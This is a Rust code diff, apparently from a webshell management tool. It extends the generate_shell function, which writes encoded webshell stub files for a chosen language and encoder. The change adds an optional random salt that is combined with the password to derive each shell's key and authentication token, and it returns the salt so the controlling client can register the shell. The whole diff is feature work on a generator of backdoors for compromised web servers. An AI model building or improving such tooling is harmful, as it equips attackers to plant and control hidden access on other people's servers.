@@ -603,6 +603,7 @@ pub async fn generate_shell(
     encoder_id: String,
     password: String,
     session: bool,
+    salted: bool,
     app: AppHandle,
 ) -> Result<GenerateShellResult, String> {
     blocking(app, move |state| {
@@ -615,13 +616,24 @@ pub async fn generate_shell(
         let encoder = EncoderRegistry::global()
             .get(&encoder_id)
             .ok_or_else(|| format!("未知编码器：{encoder_id}"))?;
+        // 加盐派生：stub 用 `salt:password` 派生密钥与鉴权令牌；
+        // 客户端登记 Shell 时需在协议参数里带上同一个盐。
+        let salt = if salted {
+            Some(uuid::Uuid::new_v4().simple().to_string()[..16].to_string())
+        } else {
+            None
+        };
+        let effective = match &salt {
+            Some(salt) => format!("{salt}:{password}"),
+            None => password.clone(),
+        };
         let content = if session {
             encoder
-                .stub_session(&language, &password)
+                .stub_session(&language, &effective)
                 .map_err(|error| error.to_string())?
         } else {
             encoder
-                .stub(&language, &password)
+                .stub(&language, &effective)
                 .map_err(|error| error.to_string())?
         };
         let filename = format!("shell_{}_{}.{}", language, encoder_id, language);
@@ -633,7 +645,11 @@ pub async fn generate_shell(
             "success",
             &format!("生成 Webshell：{filename}（{} 字节）", content.len()),
         );
-        Ok(GenerateShellResult { filename, content })
+        Ok(GenerateShellResult {
+            filename,
+            content,
+            salt,
+        })
     })
     .await
 }
